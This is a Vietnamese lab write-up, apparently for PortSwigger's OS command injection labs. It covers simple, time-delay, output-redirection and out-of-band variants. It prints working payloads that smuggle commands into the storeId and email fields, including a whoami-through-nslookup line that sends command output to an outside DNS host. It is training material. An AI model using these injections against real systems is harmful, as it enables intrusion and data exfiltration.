## OS command injection, simple case
Lỗ hổng OS Command injection trong bài lab này xảy ra ở chức năng Check stock của sản phẩm.
![image](https://hackmd.io/_uploads/ryjHb9fYGx.png)
Ứng dụng web sử dụng script được viết trong file stockreport.pl để thực hiện kiểm tra số hàng còn trong kho và trả về output cho người dùng. Cụ thể, command có dạng:`stockreport.pl <productId> <storeId>`

Thử với sản phẩm bất kì, ở đây là sản phẩm đầu tiên có productId=1 và storeId=1. Lúc này command sẽ là:`stockreport.pl 1 1`
![image](https://hackmd.io/_uploads/B18OZcGKfx.png)
Như vậy ta hoàn toàn có thể chèn OS command vào một trong 2 trường productId hoặc storeId để thực hiện lệnh mong muốn. Ví dụ ta sẽ chèn storeId thành 1; echo 'pwned' → Command được thực thi:`stockreport.pl 1 1; echo 'pwned'`
![image](https://hackmd.io/_uploads/HkxcW9ztfx.png)
Lúc này có thể thấy dòng chữ pwned đã được trả về. Bây giờ chỉ việc thay lệnh echo 'pwned' thành whoami để solve được challenge![image](https://hackmd.io/_uploads/Bkbob5zFzg.png)


## Blind OS command injection with time delays
Ở bài lab này, lỗ hổng OS command injection xảy ra tại chức năng feedback.
![image](https://hackmd.io/_uploads/SJrpZ5GFfg.png)
Cụ thể, server sẽ thực thi lệnh sau khi nhận được feedback từ người dùng:`mail -s "Hackeddddd" -aFrom:hacked@gmail.com feedback@vulnerable-website.com
`
Có thể thấy email của người dùng là vị trí ta có thể chèn lệnh OS bất kì. Thực hiện thay email thành hacked@gmail || ping -c 10 127.0.0.1 || → Command có dạng:
`mail -s "Hackeddddd" -aFrom:hacked@gmail.com || ping -c 10 127.0.0.1 || feedback@vulnerable-website.com
`
Khi đó, OS sẽ thực hiện ping ICMP 10 lần đến địa chỉ localhost và từ đó khiến response trả về sau 10 giây.
![image](https://hackmd.io/_uploads/ByhyGqMYMx.png)

## Blind OS command injection with output redirection
Đây lại là một dạng Blind OS Command Injection. Lần này ta sẽ ghi output của command vào 1 file thuộc folder mà user hiện tại có quyền ghi w, đó là /var/www/images/. Thư mục này chính là nơi chứa các ảnh mà ứng dụng load cho các posts thông qua param filename.
![image](https://hackmd.io/_uploads/HJWbzczKze.png)
Tương tự bài trên, ta sẽ chèn command vào trường email như hình dưới. Cụ thể output của lệnh whoami sẽ được ghi vào file /var/www/images/whoami.![image](https://hackmd.io/_uploads/Byqbf9GYMl.png)
Truy cập đường dẫn load ảnh với filename=whoami, lúc này nội dùng file /var/www/images/whoami được trả về.![image](https://hackmd.io/_uploads/SJBzG5GKfe.png)
## Blind OS command injection with out-of-band interaction
Lỗ hổng Blind OS command Injection lại được khai thác tại trường email của chức năng feedback. Lần này ta sẽ sử dụng lệnh nslookup để query DNS đến external domain. Sử dụng Burp Collaborator để host domain. Payload để chèn giống như hình dưới.![image](https://hackmd.io/_uploads/BJAXzqGKGx.png)
Kiểm tra Burp Collaborator ta thấy đã có các DNS query xuất hiện.![image](https://hackmd.io/_uploads/rJv4f9MFMx.png)
## Blind OS command injection with out-of-band data exfiltration

Nâng cấp từ bài 4, bài này sẽ trích xuất output command thông qua các DNS query. Sử dụng lệnh sau, ta sẽ lấy được output của lệnh whoami qua DNS query.`nslookup `whoami`.<Collaborator domain>`
`
![image](https://hackmd.io/_uploads/HJDIM5fKMe.png)
Kiểm tra Burp Collaborator, ta lấy được output của whoami là: peter-vVIWCX.![image](https://hackmd.io/_uploads/ryQvMqfKze.png)
